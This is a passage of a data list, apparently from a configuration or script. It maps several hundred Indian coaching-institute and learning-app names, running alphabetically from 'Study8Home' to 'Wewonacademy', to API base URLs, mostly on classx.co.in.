        {"name": "Study8Home", "api": "https://study8homeapi.classx.co.in"},
        {"name": "Studyadda", "api": "https://studyaddaapi.classx.co.in"},
        {"name": "Studybharat", "api": "https://studybharatapi.classx.co.in"},
        {"name": "Studybypathaksir", "api": "https://studypathaksirapi.classx.co.in"},
        {"name": "Studycapitalcuetschoolprep", "api": "https://studycapitalcuetschoolprepapi.classx.co.in"},
        {"name": "Studychampionacademy", "api": "https://studychampionacademyapi.classx.co.in"},
        {"name": "Studycomofficial", "api": "https://studycomofficialapi.classx.co.in"},
        {"name": "Studydotcom", "api": "https://studydotcomapi.classx.co.in"},
        {"name": "Studyexamacademy", "api": "https://studyexamacademyapi.classx.co.in"},
        {"name": "Studyforcareer", "api": "https://studyforcareerapi.classx.co.in"},
        {"name": "Studygurupathshala", "api": "https://studygurupathshalaapi.classx.co.in"},
        {"name": "Studyhubkuchamancity", "api": "https://studyhubkuchamancityapi.classx.co.in"},
        {"name": "Studyhubpune", "api": "https://studyhubpuneapi.classx.co.in"},
        {"name": "Studyindiaadda", "api": "https://studyindiaaddaapi.classx.co.in"},
        {"name": "Studykar", "api": "https://studykarapi.classx.co.in"},
        {"name": "Studylab", "api": "https://learnamanbarkhaapi.appx.co.in"},
        {"name": "Studylive", "api": "https://studyliveapi.classx.co.in"},
        {"name": "Studylivenavnathsir", "api": "https://studylivenavnathsirapi.classx.co.in"},
        {"name": "Studyloverveer", "api": "https://studyloverveerapi.classx.co.in"},
        {"name": "Studymantra", "api": "https://studymantraapi.classx.co.in"},
        {"name": "Studymantramns", "api": "https://studymantramnsapi.classx.co.in"},
        {"name": "Studynitijaiibcaiib", "api": "https://studynitiapi.classx.co.in"},
        {"name": "Studynow", "api": "https://studynowapi.classx.co.in"},
        {"name": "Studyofeducation", "api": "https://studyofeducationapi.classx.co.in"},
        {"name": "Studyonacademy", "api": "https://studyonacademyapi.classx.co.in"},
        {"name": "Studyonline", "api": "https://studyonlineapi.classx.co.in"},
        {"name": "Studypanel", "api": "https://studypanelapi.classx.co.in"},
        {"name": "Studypass", "api": "https://studypassapi.classx.co.in"},
        {"name": "Studypie", "api": "https://studypieapi.classx.co.in"},
        {"name": "Studypillar", "api": "https://studypillarapi.classx.co.in"},
        {"name": "Studyplanet", "api": "https://studyplanetapi.classx.co.in"},
        {"name": "Studypoint", "api": "https://dheryastudypointapi.classx.co.in"},
        {"name": "Studypointwithnigamsir", "api": "https://studypointwithnigamsirapi.classx.co.in"},
        {"name": "Studyshala20", "api": "https://studyshala20api.classx.co.in"},
        {"name": "Studysyllabus", "api": "https://studysyllabusapi.classx.co.in"},
        {"name": "Studytimebangla", "api": "https://studytimebanglaapi.classx.co.in"},
        {"name": "Studytricks", "api": "https://studytricksapi.classx.co.in"},
        {"name": "Studyupacademypune", "api": "https://studyupacademypuneapi.classx.co.in"},
        {"name": "Studyvikram", "api": "https://studyvikramapi.classx.co.in"},
        {"name": "Studywadi", "api": "https://studywadiapi.classx.co.in"},
        {"name": "Studyway", "api": "https://studywayapi.classx.co.in"},
        {"name": "Studywithbhai", "api": "https://mathswithsumitbhaiapi.classx.co.in"},
        {"name": "Studywithdedicationswd", "api": "https://studywithdedicationapi.classx.co.in"},
            {"name": "Studywithiclm", "api": "https://studyiclmapi.classx.co.in"},
        {"name": "Studywithjs", "api": "https://studywithjsapi.classx.co.in"},
        {"name": "Studywithmanita", "api": "https://studymanitaapi.classx.co.in"},
        {"name": "Studywithmk", "api": "https://studymkapi.classx.co.in"},
        {"name": "Studywithritesh", "api": "https://studyriteshapi.classx.co.in"},
        {"name": "Studywithsmriti", "api": "https://studysmritiapi.classx.co.in"},
        {"name": "Successacademyjamkhandi", "api": "https://successacademyjamkhandiapi.classx.co.in"},
        {"name": "Successcareer", "api": "https://successcareerapi.classx.co.in"},
        {"name": "Successcentresikar", "api": "https://successcentresikarapi.classx.co.in"},
        {"name": "Successforum", "api": "https://successforumapi.classx.co.in"},
        {"name": "Successgyanclasses", "api": "https://successgyanclassesapi.classx.co.in"},
        {"name": "Successicon", "api": "https://successiconapi.classx.co.in"},
        {"name": "Successmantrabydeepakrai", "api": "https://successmantraapi.classx.co.in"},
        {"name": "Successmathematics", "api": "https://successmathematicsapi.classx.co.in"},
        {"name": "Successplanet20", "api": "https://successplanet20api.classx.co.in"},
        {"name": "Successpoint", "api": "https://successpointapi.classx.co.in"},
        {"name": "Successseries", "api": "https://successseriesmumbaiapi.classx.co.in"},
        {"name": "Successseries", "api": "https://successseriesapi.classx.co.in"},
        {"name": "Successsquare", "api": "https://successsquareapi.classx.co.in"},
        {"name": "Successstenotyping", "api": "https://successstenotypingapi.classx.co.in"},
        {"name": "Sumitacademy", "api": "https://sumitacademyapi.classx.co.in"},
        {"name": "Sumitjhambclasses", "api": "https://sumitjhambclassesapi.classx.co.in"},
        {"name": "Sumitsirclasseslive", "api": "https://sumitsirclassesapi.classx.co.in"},
        {"name": "Sunlight", "api": "https://sunlightapi.classx.co.in"},
        {"name": "Sunyapcs", "api": "https://sunyapcsapi.classx.co.in"},
        {"name": "Supercenturyacademy", "api": "https://supercenturyacademyapi.classx.co.in"},
        {"name": "Superclimaxacademysca", "api": "https://superclimaxacademyapi.classx.co.in"},
        {"name": "Supernotes", "api": "https://supernotesapi.classx.co.in"},
        {"name": "Sureias", "api": "https://sureiasapi.classx.co.in"},
        {"name": "Sureshbabusir", "api": "https://sureshbabusirapi.classx.co.in"},
        {"name": "Sureshbanking20", "api": "https://sureshbankingapi.classx.co.in"},
        {"name": "Sureshsirclasses", "api": "https://sureshsirclassesapi.classx.co.in"},
        {"name": "Sureshsirscompetitiveclasses", "api": "https://sureshsirscompetitiveclassesapi.classx.co.in"},
        {"name": "Surgerydada", "api": "https://surgerydadaapi.classx.co.in"},
        {"name": "Suryainstitute", "api": "https://suryainstituteapi.classx.co.in"},
        {"name": "Suryanagriuniquelawclasses", "api": "https://suryanagriuniquelawclassesapi.classx.co.in"},
        {"name": "Suryaschool", "api": "https://suryaschoolapi.classx.co.in"},
        {"name": "Suryavanshamgurukul", "api": "https://suryavanshamgurukulapi.classx.co.in"},
        {"name": "Sushenmaharajnaikawade", "api": "https://sushenmaharajnaikawadeapi.classx.co.in"},
        {"name": "Svijharkhand", "api": "https://svijharkhandapi.classx.co.in"},
        {"name": "Swadhyayacademy", "api": "https://swadhyayacademyapi.classx.co.in"},
        {"name": "Swadhyayprabodhini", "api": "https://swadhyayprabodhiniapi.classx.co.in"},
        {"name": "Swaeducation", "api": "https://swaeducationapi.classx.co.in"},
        {"name": "Swaminathanagriinstitute", "api": "https://swaminathanagriinstitutejaipurapi.classx.co.in"},
        {"name": "Swamivivekanandainschool", "api": "https://swamivivekanandainternationalschoolapi.classx.co.in"},
        {"name": "Swamivivekanandinstitute", "api": "https://swamivivekanandinstituteapi.classx.co.in"},
        {"name": "Swapnastudies", "api": "https://swapnastudiesapi.classx.co.in"},
        {"name": "Swarajyaacademyomsir", "api": "https://swarajyaacademyomsirapi.classx.co.in"},
        {"name": "Swarajyacareeracademy", "api": "https://swarajyacareeracademyapi.classx.co.in"},
        {"name": "Swastikclasses", "api": "https://swastikclassesapi.classx.co.in"},
        {"name": "Taksh", "api": "https://takshappapi.classx.co.in"},
        {"name": "Talent", "api": "https://talentplusapi.classx.co.in"},
        {"name": "Talentacademyliscentre", "api": "https://talentacademyliscentreapi.classx.co.in"},
        {"name": "Tallyclass", "api": "https://tallyclassapi.classx.co.in"},
        {"name": "Tamilsolaiacademy", "api": "https://tamilsolaiacademyapi.classx.co.in"},
        {"name": "Tandavclasses", "api": "https://tandavclassesapi.classx.co.in"},
        {"name": "Tapasyapcs", "api": "https://tapasyapcsapi.classx.co.in"},
        {"name": "Targetcombine", "api": "https://targetcombineapi.classx.co.in"},
        {"name": "Targetdefenceacademy", "api": "https://targetdefenceacademyapi.classx.co.in"},
        {"name": "Targetforiq", "api": "https://targetforiqapi.classx.co.in"},
        {"name": "Targetgpat", "api": "https://targetgpatapi.classx.co.in"},
        {"name": "Targetgurukul", "api": "https://targetgurukulapi.classx.co.in"},
        {"name": "Targetplus", "api": "https://targetplusapi.classx.co.in"},
        {"name": "Targetsarkarinaukari", "api": "https://targetsarkarinaukriapi.classx.co.in"},
        {"name": "Targetstudyiq", "api": "https://targetstudyiqapi.classx.co.in"},
        {"name": "Targetupsc", "api": "https://targetupscapi.classx.co.in"},
        {"name": "Targetwill", "api": "https://targetwillapi.classx.co.in"},
        {"name": "Targetwithajaysir", "api": "https://targetwithajaysirapi.classx.co.in"},
        {"name": "Targetwithankit", "api": "https://targetwithankitapi.classx.co.in"},
        {"name": "Targetwithbhavikmaru", "api": "https://targetbhavikmaruapi.classx.co.in"},
        {"name": "Targetwithbhavikmarunew", "api": "https://targetwithbhavikmaruapi.classx.co.in"},
        {"name": "Tathagatgsprep", "api": "https://tathagatgsprepapi.classx.co.in"},
        {"name": "Tcsexam", "api": "https://tcsexamzoneapi.classx.co.in"},
        {"name": "Teacheracademy", "api": "https://teacheracademyapi.classx.co.in"},
        {"name": "Teachersacademykng", "api": "https://teachersacademykngapi.classx.co.in"},
        {"name": "Teachersachievers", "api": "https://teachersachieversapi.classx.co.in"},
        {"name": "Teacherselectacademy", "api": "https://teacherselectacademyapi.classx.co.in"},
        {"name": "Teachersexpressofficial", "api": "https://teachersexpressofficialapi.classx.co.in"},
        {"name": "Teachersgurukul", "api": "https://teachersgurukulapi.classx.co.in"},
        {"name": "Teachersmantra", "api": "https://teachersmantraapi.classx.co.in"},
        {"name": "Teachersway", "api": "https://teacherswayapi.classx.co.in"},
        {"name": "Teachextra", "api": "https://teachextraapi.classx.co.in"},
        {"name": "Teachingoriented", "api": "https://teachingorientedapi.classx.co.in"},
        {"name": "Teachingpariksha", "api": "https://teachingparikshaapi.classx.co.in"},
        {"name": "Techcapsule", "api": "https://techcapsuleapi.classx.co.in"},
        {"name": "Techelitelive", "api": "https://techeliteliveapi.classx.co.in"},
        {"name": "Techhubclasses", "api": "https://techhubclassesapi.classx.co.in"},
        {"name": "Techiesms", "api": "https://techiesmsapi.classx.co.in"},
        {"name": "Techmechanicalelectrical", "api": "https://techmechanicalelectricalapi.classx.co.in"},
        {"name": "Technicaljobgyan", "api": "https://technicaljobgyanapi.classx.co.in"},
        {"name": "Technogateeducation", "api": "https://technogateeducationapi.classx.co.in"},
        {"name": "Techstudyiti", "api": "https://techstudyitiapi.classx.co.in"},
        {"name": "Techtech", "api": "https://techtechapi.classx.co.in"},
        {"name": "Teejanshpathshala", "api": "https://teejanshpathshalaapi.classx.co.in"},
        {"name": "Tegonity", "api": "https://tegonityapi.classx.co.in"},
        {"name": "Tejaswigovernmentexams", "api": "https://tejaswigovernmentexamsapi.classx.co.in"},
        {"name": "Telugurailways", "api": "https://telugurailwaysapi.classx.co.in"},
        {"name": "Tempdb", "api": "https://tempapi.classx.co.in"},
        {"name": "Test247", "api": "https://test247api.classx.co.in"},
        {"name": "Testcreds", "api": "https://testcredsapi.classx.co.in"},
        {"name": "Testfactory", "api": "https://testfactoryapi.classx.co.in"},
        {"name": "Testingmigration", "api": "https://testingmigrationapi.classx.co.in"},
        {"name": "Testpaper", "api": "https://testpaperapi.classx.co.in"},
        {"name": "Testpass", "api": "https://thetestpassapi.classx.co.in"},
        {"name": "Testplace", "api": "https://testplaceapi.classx.co.in"},
        {"name": "Testprep", "api": "https://thetestprepapi.classx.co.in"},
        {"name": "Testpur", "api": "https://testpurapi.classx.co.in"},
        {"name": "Testwala", "api": "https://testwalaapi.classx.co.in"},
        {"name": "Testyourtaiyarimind4Academy", "api": "https://testyourtaiyariapi.classx.co.in"},
        {"name": "Tharunspeaks", "api": "https://tharunspeaksapi.classx.co.in"},
        {"name": "Theachievesmentorship", "api": "https://theachievesmentorshipapi.classx.co.in"},
        {"name": "Theakacademy", "api": "https://akacademyapi.classx.co.in"},
        {"name": "Theananteducation", "api": "https://ananteducationapi.classx.co.in"},
        {"name": "Theapronboy", "api": "https://apronboyapi.classx.co.in"},
        {"name": "Thearmyboy", "api": "https://thearmyboyapi.classx.co.in"},
        {"name": "Theboardsacademy", "api": "https://theboardsacademyapi.classx.co.in"},
        {"name": "Thecivilindiaofficial", "api": "https://civilindiaofficialapi.classx.co.in"},
        {"name": "Thecivilsclub", "api": "https://civilsclubapi.classx.co.in"},
        {"name": "Thecoach", "api": "https://thecoachapi.classx.co.in"},
        {"name": "Thecodeskool", "api": "https://thecodeskoolapi.classx.co.in"},
        {"name": "Thecodingbus", "api": "https://codingbusapi.classx.co.in"},
        {"name": "Theconceptualias", "api": "https://theconceptualiasapi.classx.co.in"},
        {"name": "Thecoreacademy", "api": "https://coreacademyapi.classx.co.in"},
        {"name": "Thedepartment", "api": "https://thedepartmentapi.classx.co.in"},
        {"name": "Theeducationadda", "api": "https://educationaddaapi.classx.co.in"},
        {"name": "Thegrmacademy", "api": "https://grmacademyapi.classx.co.in"},
        {"name": "Thehistoricaias", "api": "https://historicaiasapi.classx.co.in"},
        {"name": "Theimaiasras", "api": "https://imaiasrasapi.classx.co.in"},
        {"name": "Thekpsharmaexamsprep", "api": "https://kpsharmaexamsprepapi.classx.co.in"},
        {"name": "Thelastexam", "api": "https://lastexamapi.teachx.in"},
        {"name": "Thelifistudy", "api": "https://lifistudyapi.classx.co.in"},
        {"name": "Thelionacademy", "api": "https://lionacademyapi.classx.co.in"},
        {"name": "Thelyceum", "api": "https://lyceumapi.classx.co.in"},
        {"name": "Themathscafe", "api": "https://mathscafeapi.classx.co.in"},
        {"name": "Thembbsplanet", "api": "https://mbbsplanetapi.classx.co.in"},
        {"name": "Thementors", "api": "https://thementorsapi.classx.co.in"},
        {"name": "Themotionclasses", "api": "https://themotionclassesapi.classx.co.in"},
        {"name": "Thenayakacademyamravati", "api": "https://nayakacademyamravatiapi.classx.co.in"},
        {"name": "Thenpibuxar", "api": "https://npibuxarapi.classx.co.in"},
        {"name": "Theofficersacadem", "api": "https://theofficersacademyapi.classx.co.in"},
        {"name": "Theofficersacademy", "api": "https://theofficersacademyapi.appx.co.in"},
        {"name": "Theoryofphysics", "api": "https://theoryphysicsapi.classx.co.in"},
        {"name": "Theparikshanitiacademy", "api": "https://parikshanitiacademyapi.classx.co.in"},
        {"name": "Thephidiasacademy", "api": "https://phidiasacademyapi.classx.co.in"},
        {"name": "Thephoenixacademypune", "api": "https://phoenixacademypuneapi.classx.co.in"},
        {"name": "Theplatform", "api": "https://platformapi.classx.co.in"},
        {"name": "Theplatform2O", "api": "https://theplatformapi.classx.co.in"},
        {"name": "Thepremieracademy", "api": "https://thepremieracademyapi.classx.co.in"},
        {"name": "Theprimeacademy", "api": "https://theprimeacademyapi.classx.co.in"},
        {"name": "Therasayanam", "api": "https://therasayanamapi.classx.co.in"},
        {"name": "Thesamarthacademy", "api": "https://thesamarthacademyapi.classx.co.in"},
        {"name": "Theschooleducationadda", "api": "https://schooleducationaddaapi.classx.co.in"},
        {"name": "Thesciencelaserbysumitshukla", "api": "https://sciencelasersumitshuklaapi.classx.co.in"},
        {"name": "Theselectionguru", "api": "https://theselectionguruapi.classx.co.in"},
        {"name": "Thesmartstudy", "api": "https://thesmartstudyapi.classx.co.in"},
        {"name": "Thespeed", "api": "https://speedcoachingapi.teachx.in"},
        {"name": "Thespeedcoaching", "api": "https://speedcoachingapi.classx.co.in"},
        {"name": "Thestudyline", "api": "https://thestudylineapi.classx.co.in"},
        {"name": "Thetargetdreamitchaseit", "api": "https://thetargetapi.classx.co.in"},
        {"name": "Theteacher", "api": "https://theteacherapi.classx.co.in"},
        {"name": "Thevectoracademy", "api": "https://vectoracademyapi.classx.co.in"},
        {"name": "Thevijeeshacademy", "api": "https://vijeeshacademyapi.classx.co.in"},
        {"name": "Thewinnersacademy", "api": "https://thewinnersacademyapi.classx.co.in"},
        {"name": "Thinkias", "api": "https://thinkiasapi.classx.co.in"},
        {"name": "Thinkssc", "api": "https://thinksscapi.classx.co.in"},
        {"name": "Tikkarmarathi", "api": "https://tikkarmarathiapi.classx.co.in"},
        {"name": "Timeforgreatness", "api": "https://timegreatnessapi.classx.co.in"},
        {"name": "Timelineeducation", "api": "https://timelineeducationapi.classx.co.in"},
        {"name": "Tirupatiiasbhopal", "api": "https://tirupatiiasbhopalapi.classx.co.in"},
        {"name": "Tiwaricampus", "api": "https://tiwaricampusapi.classx.co.in"},
        {"name": "Tkpacademy", "api": "https://tkpacademyapi.classx.co.in"},
        {"name": "Tnacademylearningapp", "api": "https://tnacademylearningapi.classx.co.in"},
        {"name": "Tnicollegeofcompetitions", "api": "https://tnicollegecompetitionsapi.classx.co.in"},
        {"name": "Toc", "api": "https://toclearningapi.teachx.in"},
        {"name": "Toclearningapp", "api": "https://toclearningapi.classx.co.in"},
        {"name": "Toothpracto", "api": "https://toothpractoapi.classx.co.in"},
        {"name": "Toppers24", "api": "https://toppers24inapi.classx.co.in"},
        {"name": "Toppersadda", "api": "https://studymateapi.classx.co.in"},
        {"name": "Toppersinitiative", "api": "https://toppersinitiativeapi.classx.co.in"},
        {"name": "Topperstest", "api": "https://topperstestapi.classx.co.in"},
        {"name": "Toppertemple", "api": "https://toppertempleapi.classx.co.in"},
        {"name": "Topsthan", "api": "https://topsthanapi.classx.co.in"},
        {"name": "Toptak", "api": "https://rahuldeshwalacademyapi.appx.co.in"},
        {"name": "Totallearning", "api": "https://totallearningapi.classx.co.in"},
        {"name": "Tradingkulture", "api": "https://tradingkultureapi.classx.co.in"},
        {"name": "Trendtutor", "api": "https://trendtutorapi.classx.co.in"},
        {"name": "Trickyacademyno1", "api": "https://trickyacademyno1api.classx.co.in"},
        {"name": "Trinetraias", "api": "https://trinetraiasapi.classx.co.in"},
        {"name": "Trinity", "api": "https://trinityapi.classx.co.in"},
        {"name": "Tripbohemia", "api": "https://tripbohemiaapi.classx.co.in"},
        {"name": "Triplingphysic", "api": "https://triplingphysicsapi.classx.co.in"},
        {"name": "Trishakti", "api": "https://trishaktiapi.classx.co.in"},
        {"name": "Trueiq", "api": "https://trueiqapi.classx.co.in"},
        {"name": "Tsbaditetdsc", "api": "https://tsbaditetdscapi.classx.co.in"},
        {"name": "Tsironlineclasses", "api": "https://tsironlineclassesapi.classx.co.in"},
        {"name": "Tslnursingcoaching", "api": "https://tslnursingcoachingapi.classx.co.in"},
        {"name": "Tubeenglish", "api": "https://tubeenglishapi.classx.co.in"},
        {"name": "Tuitiongharofficial", "api": "https://tuitiongharofficialapi.classx.co.in"},
        {"name": "Turningpointvijayamcompetitiveexams", "api": "https://turningpointapi.classx.co.in"},
        {"name": "Tutoralearningapp", "api": "https://tutoralearningappapi.classx.co.in"},
        {"name": "Tutorizeacademy", "api": "https://tutorizeacademyapi.classx.co.in"},
        {"name": "Tutorsadda", "api": "https://tutorsaddaapi.classx.co.in"},
        {"name": "Tutosadda", "api": "https://tutorsaddaapi.teachx.in"},
        {"name": "Twelthplus", "api": "https://plus12thapi.classx.co.in"},
        {"name": "Twelveminutestoclat", "api": "https://minutes12toclatapi.classx.co.in"},
        {"name": "Twentyfourhrsstudycentre", "api": "https://24hrsstudycentreapi.classx.co.in"},
        {"name": "Twsacademy", "api": "https://twsacademyapi.classx.co.in"},
        {"name": "Uascareerinstitute", "api": "https://uascareerinstituteapi.classx.co.in"},
        {"name": "Ucananenglishacademy", "api": "https://ucanenglishacademyapi.classx.co.in"},
        {"name": "Uclive", "api": "https://ucliveapi.classx.co.in"},
        {"name": "Udaaninstitute", "api": "https://udaaninstituteapi.classx.co.in"},
        {"name": "Udaaninstituteofexcellence", "api": "https://udaaninstituteexcellencenandedapi.classx.co.in"},
        {"name": "Udaicareeracademy", "api": "https://udaicareeracademyapi.classx.co.in"},
        {"name": "Udaipurclasses", "api": "https://udaipurclassesapi.classx.co.in"},
        {"name": "Udaykadamsmarathiacademy", "api": "https://udaykadamsmarathiacademyapi.classx.co.in"},
        {"name": "Udbhavaacademy", "api": "https://udbhavaacademyapi.classx.co.in"},
        {"name": "Ufjapp", "api": "https://ufjappapi.classx.co.in"},
        {"name": "Ujjwalclasses", "api": "https://ujjwalclassesapi.classx.co.in"},
        {"name": "Ujjwalclassesrajasthan", "api": "https://ujjwalclassesrajasthanapi.classx.co.in"},
        {"name": "Umaiiasacademy", "api": "https://umaiiasacademyapi.classx.co.in"},
        {"name": "Umangcareeracademy", "api": "https://umangcareeracademyapi.classx.co.in"},
        {"name": "Umangstudy", "api": "https://umangstudyapi.classx.co.in"},
        {"name": "Umaudaanmasteracademy", "api": "https://umaudaanmasteracademyapi.classx.co.in"},
        {"name": "Umediasacademy", "api": "https://umediasacademyapi.classx.co.in"},
        {"name": "Umedmpsc", "api": "https://umedmpscapi.classx.co.in"},
        {"name": "Umeshsharmaacademy", "api": "https://umeshsharmaacademyapi.classx.co.in"},
        {"name": "Uniexamsshiksha", "api": "https://uniexamsshikshaapi.classx.co.in"},
        {"name": "Unifoxconnected", "api": "https://unifoxconnectedapi.classx.co.in"},
        {"name": "Unifystudy", "api": "https://unifystudyapi.classx.co.in"},
        {"name": "Uniqueacademy", "api": "https://uniqueacademyapi.classx.co.in"},
        {"name": "Uniquecivil", "api": "https://uniquecivilapi.classx.co.in"},
        {"name": "Uniquegyanofficial", "api": "https://uniquegyanofficialapi.classx.co.in"},
        {"name": "Uniqueonlineclasses", "api": "https://uniqueonlineclassesapi.classx.co.in"},
        {"name": "Uniquephysics", "api": "https://uniquephysicsapi.classx.co.in"},
        {"name": "Uniquescienceacademy", "api": "https://uniquescienceacademyapi.classx.co.in"},
        {"name": "Unnatieducation", "api": "https://unnatieducationapi.classx.co.in"},
        {"name": "Unskillseducationlearnskill", "api": "https://unskillseducationlearnskillapi.classx.co.in"},
        {"name": "Upastapanainsititute", "api": "https://upastapanainsitituteapi.classx.co.in"},
        {"name": "Upclassesprayagraj", "api": "https://upclassesprayagrajapi.classx.co.in"},
        {"name": "Upgradeeducationofficial", "api": "https://upgradeeducationapi.classx.co.in"},
        {"name": "Upscalecode", "api": "https://upscalecodeapi.classx.co.in"},
        {"name": "Upsckaadda", "api": "https://upsckaaddaapi.classx.co.in"},
        {"name": "Upsckit", "api": "https://upsckitapi.classx.co.in"},
        {"name": "Upscmitra", "api": "https://upscmitraapi.classx.co.in"},
        {"name": "Upscsupersimplified", "api": "https://upscsupersimplifiedapi.classx.co.in"},
        {"name": "Upscvidyalaya", "api": "https://upscvidyalayaapi.classx.co.in"},
        {"name": "Urdubyirfan", "api": "https://urdubyirfanapi.classx.co.in"},
        {"name": "Utkarshclasses", "api": "https://utkarshclassesapi.classx.co.in"},
        {"name": "Uttamsacademy2", "api": "https://uttamsacademy2api.classx.co.in"},
        {"name": "Vaijanathdhendulesacademy", "api": "https://vaijanathdhendulesacademyapi.classx.co.in"},
        {"name": "Vaishnaviharkirat", "api": "https://vyshnaviapi.classx.co.in"},
        {"name": "Vajacademy", "api": "https://vajacademyapi.classx.co.in"},
        {"name": "Vakeelacademy", "api": "https://vakeelacademyapi.classx.co.in"},
        {"name": "Vamjaeducation", "api": "https://vamjaeducationapi.classx.co.in"},
        {"name": "Varunawasthi", "api": "https://examenginevarunawasthiapi.classx.co.in"},
        {"name": "Vasuconcept", "api": "https://vasuconceptapi.classx.co.in"},
        {"name": "Vaticaninstitute", "api": "https://vaticaninstituteapi.classx.co.in"},
        {"name": "Vcan24", "api": "https://vcan24api.classx.co.in"},
        {"name": "Vconlineclasses", "api": "https://vconlineclassesapi.classx.co.in"},
        {"name": "Vdemy", "api": "https://vdemyapi.classx.co.in"},
        {"name": "Vedakshiclasses", "api": "https://vedakshiclassesapi.classx.co.in"},
        {"name": "Vedamclassesstudyguardian", "api": "https://vedamclassesapi.classx.co.in"},
        {"name": "Vedanteducation", "api": "https://vedanteducationapi.classx.co.in"},
        {"name": "Vedantgurukul", "api": "https://vedantgurukulapi.classx.co.in"},
        {"name": "Vedantstudy", "api": "https://vedantstudyapi.classx.co.in"},
        {"name": "Veddigitaleducation", "api": "https://veddigitaleducationapi.classx.co.in"},
        {"name": "Vedicias", "api": "https://vediciasapi.classx.co.in"},
        {"name": "Vedpathshala", "api": "https://vedpathshalaapi.classx.co.in"},
        {"name": "Vedprep", "api": "https://vedprepapi.classx.co.in"},
        {"name": "Veertejango", "api": "https://veertejangoapi.classx.co.in"},
        {"name": "Venkatagirienglish", "api": "https://venkatagirienglishapi.classx.co.in"},
        {"name": "Venusshorthandclasses", "api": "https://venusshorthandclassesapi.classx.co.in"},
        {"name": "Verbalistlearning", "api": "https://verbalistlearningapi.classx.co.in"},
        {"name": "Veteran", "api": "https://veteranapi.classx.co.in"},
        {"name": "Vfirst", "api": "https://vfirstapi.classx.co.in"},
        {"name": "Vibrantelearning", "api": "https://vibrantelearningapi.classx.co.in"},
        {"name": "Vicsindore", "api": "https://vicsindoreapi.classx.co.in"},
        {"name": "Vidhanlawclasses", "api": "https://vidhanlawclassesapi.classx.co.in"},
        {"name": "Vidhigurukul", "api": "https://vidhigurukulapi.classx.co.in"},
        {"name": "Vidhyaagricultureacademy", "api": "https://vidhyaagricultureacademykanpurapi.classx.co.in"},
        {"name": "Vidhyakendra", "api": "https://vidhyakendraapi.classx.co.in"},
        {"name": "Vidwancompetition", "api": "https://vidwancompetitionapi.classx.co.in"},
        {"name": "Vidyabihar", "api": "https://vidyabiharapi.teachx.in"},
        {"name": "Vidyabihar", "api": "https://vidyabiharapi.classx.co.in"},
        {"name": "Vidyadarpan", "api": "https://vidyadarpanapi.classx.co.in"},
        {"name": "Vidyaguruschoolprep", "api": "https://vidyaguruschoolprepapi.classx.co.in"},
        {"name": "Vidyanjalipoint", "api": "https://vidyanjalipointapi.classx.co.in"},
        {"name": "Vidyapeethrajasthan", "api": "https://vidyapeethrajasthanapi.classx.co.in"},
        {"name": "Vidyapower", "api": "https://vidyapowerapi.classx.co.in"},
        {"name": "Vidyasagaracademypune", "api": "https://vidyasagaracademypuneapi.classx.co.in"},
        {"name": "Vidyashreemanthan", "api": "https://vidyashreemanthanapi.classx.co.in"},
        {"name": "Vigyanvriksha", "api": "https://vigyanvrikshaapi.classx.co.in"},
        {"name": "Vijayacademy", "api": "https://vijayacademyapi.classx.co.in"},
        {"name": "Vijayacademyindore", "api": "https://vijayacademyindoreapi.classx.co.in"},
        {"name": "Vijayclasses", "api": "https://vijayclassesapi.classx.co.in"},
        {"name": "Vijaykantsirofficial", "api": "https://vijaykantsirofficialapi.classx.co.in"},
        {"name": "Vijaypathacademy", "api": "https://vijaypathacademyapi.classx.co.in"},
        {"name": "Vijaypathdefence", "api": "https://vijaypathdefenceapi.classx.co.in"},
        {"name": "Vijendrasirstudyhub", "api": "https://vijendrasirstudyhubapi.classx.co.in"},
        {"name": "Vikalpkotwal", "api": "https://vikalpkotwalapi.classx.co.in"},
        {"name": "Vikascoaching", "api": "https://vikascoachingapi.classx.co.in"},
        {"name": "Vikasshuklaenglish", "api": "https://vikasshuklaenglishapi.classx.co.in"},
        {"name": "Vineettutorials", "api": "https://vineettutorialsapi.classx.co.in"},
        {"name": "Vipgurugofficial", "api": "https://vipgurugofficialapi.classx.co.in"},
        {"name": "Virajnationalacademy", "api": "https://virajnationalapi.classx.co.in"},
        {"name": "Vishalkhodifad", "api": "https://vishalkhodifadapi.classx.co.in"},
        {"name": "Vishwamarathi", "api": "https://vishwamarathiapi.classx.co.in"},
        {"name": "Vishwasacademy", "api": "https://vishwasacademyapi.classx.co.in"},
        {"name": "Visionacademyofficial", "api": "https://visionacademyofficialapi.classx.co.in"},
        {"name": "Visioncoachingclassesakole", "api": "https://visioncoachingclassesakoleapi.classx.co.in"},
        {"name": "Visionkhaki", "api": "https://visionkhakiapi.classx.co.in"},
        {"name": "Visionscience", "api": "https://visionscienceapi.classx.co.in"},
        {"name": "Visionupdate", "api": "https://visionupdateapi.classx.co.in"},
        {"name": "Visionupsc", "api": "https://visionupscapi.classx.co.in"},
        {"name": "Vitaneducation", "api": "https://vitaneducationapi.classx.co.in"},
        {"name": "Vitthalkangane", "api": "https://vitthalkanganeapi.classx.co.in"},
        {"name": "Vivanta", "api": "https://vivantaapi.classx.co.in"},
        {"name": "Vivekanandlearningappvla", "api": "https://vivekanandlearningappapi.classx.co.in"},
        {"name": "Vivekanandpublicintercollege", "api": "https://vivekanandpublicintercollegeapi.classx.co.in"},
        {"name": "Vivekpawaracademy", "api": "https://vivekacademyapi.classx.co.in"},
        {"name": "Vj", "api": "https://vjeducationapi.appx.co.in"},
        {"name": "Vjeducvation", "api": "https://vjeducationapi.classx.co.in"},
        {"name": "Vlrtraining", "api": "https://vlrtrainingapi.classx.co.in"},
        {"name": "Vmrlogics", "api": "https://vmrlogicsapi.classx.co.in"},
        {"name": "Vnrclasses", "api": "https://vnrclassesapi.classx.co.in"},
        {"name": "Voraclasses", "api": "https://voraclassesapi.classx.co.in"},
        {"name": "Vseducationofficial", "api": "https://vseducationapi.classx.co.in"},
        {"name": "Vsmpscacademy", "api": "https://vsmpscacademyapi.classx.co.in"},
        {"name": "Vvsias", "api": "https://vvsiasapi.classx.co.in"},
        {"name": "Warriorofficer", "api": "https://warriorofficerapi.classx.co.in"},
        {"name": "Wealthsagalearn", "api": "https://wealthsagalearnapi.classx.co.in"},
        {"name": "Webcityitgk", "api": "https://webcityitgkapi.classx.co.in"},
        {"name": "Webdemybysaunaksir", "api": "https://webdemysaunaksirapi.classx.co.in"},
        {"name": "Webinar", "api": "https://webinarapi.classx.co.in"},
        {"name": "Websankulcivilengineering", "api": "https://websankulcivilengineeringapi.classx.co.in"},
        {"name": "Websankullive", "api": "https://websankulliveapi.classx.co.in"},
        {"name": "Wewonacademy", "api": "https://wewonacademyapi.classx.co.in"},
